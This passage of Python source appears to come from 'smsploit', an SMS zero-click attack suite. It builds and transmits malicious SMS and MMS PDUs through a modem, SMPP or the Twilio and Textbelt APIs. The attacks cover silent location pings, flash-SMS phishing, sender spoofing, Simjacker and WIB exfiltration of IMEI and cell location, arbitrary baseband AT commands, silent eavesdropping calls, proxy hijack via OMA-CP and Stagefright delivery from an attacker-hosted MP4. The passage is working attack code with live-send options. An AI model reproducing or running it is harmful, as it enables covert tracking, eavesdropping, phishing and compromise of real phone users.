      smpp_host, smpp_port, smpp_id, smpp_pw — SMPP transport
      text     — message text (flash)
    """
    sim         = kwargs.get("sim", True)
    smsc        = kwargs.get("smsc", "")
    device      = kwargs.get("device", "/dev/ttyUSB0")
    exfil       = kwargs.get("exfil", target)
    proxy_ip    = kwargs.get("proxy_ip", "")
    mp4_url     = kwargs.get("mp4_url", "")
    at_cmd      = kwargs.get("at_cmd", 'AT+CUSD=1,"*#06#",15')
    spoof_from  = kwargs.get("spoof_from", "")
    call_to  = kwargs.get("call_to", exfil)
    text     = kwargs.get("text", "Security Alert: Tap to verify your account.")

    smpp_host    = kwargs.get("smpp_host", "")
    smpp_port    = int(kwargs.get("smpp_port", 2775))
    smpp_id      = kwargs.get("smpp_id", "")
    smpp_pw      = kwargs.get("smpp_pw", "")
    api_provider = kwargs.get("api_provider", "")   # "textbelt" or "twilio"
    api_key      = kwargs.get("api_key", "textbelt")
    twilio_sid   = kwargs.get("twilio_sid", "")
    twilio_token = kwargs.get("twilio_token", "")
    twilio_from  = kwargs.get("twilio_from", "")

    # Decide transport
    use_api   = bool(api_provider)
    use_smpp  = bool(smpp_host) and not use_api
    use_gammu = not use_smpp and not use_api and not sim

    print(f"\n  {'━'*56}")
    print(f"  {W}SMS ZERO-CLICK{N}  attack={C}{attack}{N}  target={G}{target}{N}")
    _transport_label = (
        f"API → {api_provider}" if use_api else
        f"SMPP → {smpp_host}"   if use_smpp else
        f"gammu → {device}"     if use_gammu else
        f"{Y}SIMULATION{N}"
    )
    print(f"  Transport: {_transport_label}")
    print(f"  {'━'*56}\n")

    # Build PDU
    pdu     = None
    mms_pdu = None

    if attack == "silent":
        pdu = build_silent_sms(target, smsc)
        _inf("Silent SMS (Type 0): processes silently, forces location update")

    elif attack == "flash":
        pdu = build_flash_sms(target, text, smsc)
        _inf(f"Flash SMS (Class 0): pops on screen → '{text[:40]}'")

    elif attack == "flash_overflow":
        pdu = build_flash_sms_overflow(target, smsc)
        _inf("Flash SMS malformed UDL: triggers heap underread on Qualcomm RIL")

    elif attack == "simjacker":
        pdu = build_simjacker_provide_local_info(target, exfil, smsc)
        _inf(f"Simjacker PROVIDE_LOCAL_INFO → SEND_SMS to {exfil}")
        _inf("SIM will exfiltrate IMEI + cell-ID silently")

    elif attack == "simjacker_at":
        pdu = build_simjacker_run_at(target, at_cmd, smsc)
        _inf(f"Simjacker RUN_AT: {at_cmd}")

    elif attack == "simjacker_call":
        pdu = build_simjacker_setup_call(target, call_to, smsc)
        _inf(f"Simjacker SETUP_CALL → silent call to {call_to}")

    elif attack == "wib":
        pdu = build_wib_provide_local_info(target, exfil, smsc)
        _inf(f"WIBattack PROVIDE_LOCAL_INFO → exfil to {exfil}")

    elif attack == "wap_push":
        if not proxy_ip:
            _err("--proxy required for wap_push (attacker IP:port)")
            return
        pdu = build_wap_push_oma_cp(target, proxy_ip, int(kwargs.get("proxy_port", 8080)), smsc)
        _inf(f"WAP Push OMA-CP: set victim proxy → {proxy_ip}")
        _warn("Unauthenticated on Samsung/Huawei/LG/Sony Android (CVE-2019-11494)")

    elif attack == "stagefright":
        if not mp4_url:
            _err("--mp4 required for stagefright (URL to malicious MP4)")
            return
        mms_pdu = build_stagefright_mms(target, mp4_url, kwargs.get("mmsc",""))
        _inf(f"Stagefright MMS: content-location → {mp4_url}")
        _warn("Affects Android <5.1.1 (pre-Aug2015 patch). Auto-download = no user tap needed.")
        _inf(f"MMS PDU ({mms_pdu['mms_pdu_len']} bytes): {mms_pdu['mms_pdu_hex'][:64]}...")
        _inf(f"Send cmd: {mms_pdu['send_cmd']}")
        return mms_pdu

    else:
        _err(f"Unknown attack: {attack}")
        _usage()
        return

    if pdu is None:
        _err("PDU build failed")
        return

    smsc_len  = pdu[0] + 1 if pdu else 0
    tpdu_len  = len(pdu) - smsc_len

    # ── Spoof sender: inject TP-OA after SMSC prefix ──────────────────────────
    # Standard SMS-SUBMIT layout: [SMSC][TP-MTI][TP-MR][TP-DA...][PID][DCS][VP][UDL][UD]
    # We insert the OA field right after TP-MR (byte 2 of TPDU) so gateways that
    # honour TP-OA (SoftSMSC, SS7 hubs, some femtocells) use our spoofed sender.
    # SMPP transport uses source_addr instead (more reliable).
    if spoof_from:
        if re.match(r'^[+\d]+$', spoof_from):
            oa_enc = _encode_addr(spoof_from)
            label  = spoof_from
        else:
            oa_enc = _encode_alpha_addr(spoof_from)
            label  = f'"{spoof_from}" (alphanumeric)'
        # Inject: SMSC_bytes | MTI | MR | OA | rest_of_tpdu
        tpdu      = pdu[smsc_len:]
        pdu_spoof = pdu[:smsc_len] + tpdu[:2] + oa_enc + tpdu[2:]
        _ok(f"Sender spoofed → {G}{label}{N}")
        _warn("Carrier delivery depends on gateway: SMPP source_addr is most reliable")
        print(f"  OA field : {oa_enc.hex()}  (injected into TPDU)")
        pdu      = pdu_spoof
        smsc_len = pdu[0] + 1
        tpdu_len = len(pdu) - smsc_len
    else:
        _warn(f"No sender spoof — victim sees your real MSISDN (use --spoof-from)")

    print(f"  PDU hex  : {pdu.hex()}")
    print(f"  PDU len  : {len(pdu)} bytes (TPDU: {tpdu_len})")
    print()

    # Transmit
    result = None
    if use_api:
        # API transport: flash/silent content delivered as plain text
        # (binary PDU attacks not possible via HTTP API — those need modem/SMPP)
        if attack in ("simjacker", "simjacker_at", "simjacker_call",
                      "wib", "silent", "flash_overflow", "wap_push"):
            _warn(f"Attack '{attack}' requires binary PDU — HTTP API can only send text SMS")
            _warn("Sending text representation as proof-of-concept delivery test")
            msg = f"[{attack.upper()} TEST] Binary PDU: {pdu.hex()[:40]}..."
        else:
            msg = text  # flash — use the actual text content

        # Use spoof_from as API sender when available
        effective_from = twilio_from or spoof_from or ""
        at = APITransport(
            provider     = api_provider,
            api_key      = api_key,
            twilio_sid   = twilio_sid,
            twilio_token = twilio_token,
            twilio_from  = effective_from,
        )
        at._flash = (attack == "flash")   # tell seven.io to use type=flash
        result = at.send_text(target, msg)

    elif use_smpp:
        t = SMPPTransport(smpp_host, smpp_port, smpp_id, smpp_pw, sim=False)
        if t.connect_bind():
            # spoof_from sets SMPP source_addr — most reliable spoofing method
            src = spoof_from or smsc or "00000"
            result = t.submit_binary(src, target, pdu[smsc_len:])
            t.disconnect()
    else:
        t = GammuTransport(device=device, sim=sim)
        result = t.send_pdu(pdu, tpdu_len)

    if result:
        if result.get("sim"):
            _warn("Simulation complete — no SMS transmitted")
            _inf(f"To send live: gammu --device /dev/ttyUSB0 --sendpdu {pdu.hex()} {tpdu_len}")
        elif result.get("ok") or result.get("success"):
            _ok("Attack SMS delivered")
        elif result.get("error"):
            _err(f"Send failed: {result['error']}")

    return result


# ══════════════════════════════════════════════════════════════════════════════
# CLI
# ══════════════════════════════════════════════════════════════════════════════

def _usage():
    attacks = [
        ("silent",          "Stealth ping — forces location update, confirms live number"),
        ("flash",           "Class 0 popup — shows on screen, never stored"),
        ("flash_overflow",  "Malformed UDL — crashes Qualcomm RIL (DoS/possible RCE)"),
        ("simjacker",       "S@T browser: exfiltrate IMEI+cell-ID via hidden SMS"),
        ("simjacker_at",    "S@T browser: run arbitrary AT command on baseband"),
        ("simjacker_call",  "S@T browser: open silent background call (eavesdrop)"),
        ("wib",             "WIB browser: same as simjacker, different SIM applet"),
        ("wap_push",        "OMA-CP: silently set victim HTTP proxy (CVE-2019-11494)"),
        ("stagefright",     "MMS auto-parse RCE on Android <5.1.1 (CVE-2015-1538)"),
    ]
    print(f"""
{W}SMS Zero-Click Attack Suite{N}

{C}Usage:{N}  bash start smsploit <attack> <phone> [options]

{Y}Attacks:{N}""")
    for a, d in attacks:
        print(f"  {G}{a:<20}{N} {d}")
    print(f"""
{Y}Options:{N}
  --exfil  MSISDN     Simjacker: exfiltration destination number
  --at     CMD        simjacker_at: AT command (default: AT+CUSD=1,"*#06#",15)
  --call   MSISDN     simjacker_call: number to call
  --proxy  IP         wap_push: attacker proxy IP
  --proxy-port PORT   wap_push: proxy port (default 8080)
  --mp4    URL        stagefright: URL to malicious MP4
  --mmsc   URL        stagefright: carrier MMSC URL
  --text   TEXT       flash: message text
  --spoof-from NUM    Spoof sender number or name (e.g. +12025550100 or "Apple")
                      PDU: injects TP-OA field.  SMPP: sets source_addr (TON=5 for alpha)
                      Best anonymity: alphanumeric name via SMPP (no real number shown)
  --smsc   NUMBER     Override SMSC number
  --device PATH       gammu device (default /dev/ttyUSB0)
  --api    PROVIDER   HTTP API transport: textbelt | seven | twilio  (no modem needed)
  --api-key KEY       API key (textbelt default key = 'textbelt', 1 free/day)
  --twilio-sid SID    Twilio account SID
  --twilio-token TOK  Twilio auth token
  --twilio-from NUM   Twilio sender number (E.164)
  --smpp-host HOST    Use SMPP transport instead of modem
  --smpp-port PORT    SMPP port (default 2775)
  --smpp-id   ID      SMPP system_id
  --smpp-pw   PW      SMPP password
  --live              Actually transmit (default: simulation)

{Y}Examples:{N}
  bash start smsploit silent +12025551234
  bash start smsploit simjacker +12025551234 --exfil +15005550001 --live --device /dev/ttyUSB0
  bash start smsploit simjacker_at +12025551234 --at 'AT+CFUN=0'
  bash start smsploit wap_push +12025551234 --proxy 10.0.0.5
  bash start smsploit stagefright +12025551234 --mp4 http://10.0.0.5/evil.mp4
  bash start smsploit simjacker +12025551234 --exfil +15005550001 --smpp-host 10.0.0.5 --smpp-id tester --smpp-pw secret --live
""")


def run(args=None):
    if args is None:
        args = sys.argv[1:]

    if not args or args[0] in ("-h", "--help", "help"):
        _usage()
        return

    if len(args) < 2:
        _err("Usage: smsploit <attack> <phone> [options]")
        _usage()
        return

    attack = args[0]
    target = args[1]
    kwargs = {"sim": True}

    i = 2
    while i < len(args):
        a = args[i]
        if a == "--exfil"      and i+1 < len(args): kwargs["exfil"]      = args[i+1]; i += 2; continue
        if a == "--at"         and i+1 < len(args): kwargs["at_cmd"]     = args[i+1]; i += 2; continue
        if a == "--call"       and i+1 < len(args): kwargs["call_to"]    = args[i+1]; i += 2; continue
        if a == "--proxy"      and i+1 < len(args): kwargs["proxy_ip"]   = args[i+1]; i += 2; continue
        if a == "--proxy-port" and i+1 < len(args): kwargs["proxy_port"] = args[i+1]; i += 2; continue
        if a == "--mp4"        and i+1 < len(args): kwargs["mp4_url"]    = args[i+1]; i += 2; continue
        if a == "--mmsc"       and i+1 < len(args): kwargs["mmsc"]       = args[i+1]; i += 2; continue
        if a == "--text"       and i+1 < len(args): kwargs["text"]       = args[i+1]; i += 2; continue
        if a == "--smsc"       and i+1 < len(args): kwargs["smsc"]       = args[i+1]; i += 2; continue
        if a == "--device"     and i+1 < len(args): kwargs["device"]     = args[i+1]; i += 2; continue
        if a == "--smpp-host"    and i+1 < len(args): kwargs["smpp_host"]    = args[i+1]; i += 2; continue
        if a == "--smpp-port"    and i+1 < len(args): kwargs["smpp_port"]    = args[i+1]; i += 2; continue
        if a == "--smpp-id"      and i+1 < len(args): kwargs["smpp_id"]      = args[i+1]; i += 2; continue
        if a == "--smpp-pw"      and i+1 < len(args): kwargs["smpp_pw"]      = args[i+1]; i += 2; continue
        if a == "--api"          and i+1 < len(args): kwargs["api_provider"]  = args[i+1]; i += 2; continue
        if a == "--api-key"      and i+1 < len(args): kwargs["api_key"]       = args[i+1]; i += 2; continue
        if a == "--twilio-sid"   and i+1 < len(args): kwargs["twilio_sid"]    = args[i+1]; i += 2; continue
        if a == "--twilio-token" and i+1 < len(args): kwargs["twilio_token"]  = args[i+1]; i += 2; continue
        if a == "--twilio-from"  and i+1 < len(args): kwargs["twilio_from"]   = args[i+1]; i += 2; continue
        if a == "--spoof-from"   and i+1 < len(args): kwargs["spoof_from"]    = args[i+1]; i += 2; continue
        if a == "--live":                              kwargs["sim"]           = False
        i += 1

    run_attack(attack, target, **kwargs)


if __name__ == "__main__":
    run()
